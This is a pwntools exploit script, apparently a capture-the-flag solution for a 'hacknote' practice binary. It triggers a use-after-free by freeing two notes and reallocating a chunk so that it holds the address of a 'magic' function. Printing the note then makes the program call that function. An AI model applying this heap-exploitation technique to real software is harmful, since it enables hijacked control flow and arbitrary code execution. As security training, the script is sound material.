#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def debug():
    raw_input("DEBUG: ")
    gdb.attach(io)

io = process("./hacknote")
elf = ELF("./hacknote")
magic_elf = elf.symbols["magic"]


def addNote(size, content):
    io.sendafter("choice :", "1")
    io.sendafter("size ", str(size))
    io.sendafter("Content :", content)

def delNote(idx):
    #  debug()
    io.sendafter("choice :", "2")
    io.sendafter("Index :", str(idx))

def printNote(idx):
    #  debug()
    io.sendafter("choice :", "3")
    io.sendafter("Index :", str(idx))

def uaf():
    addNote(24, "a" * 24)
    addNote(24, "b" * 24)

    delNote(0)
    delNote(1)
    #  debug()
    addNote(8,p32(magic_elf))

    printNote(0)

if __name__ == "__main__":
    uaf()
    io.interactive()
    io.close()

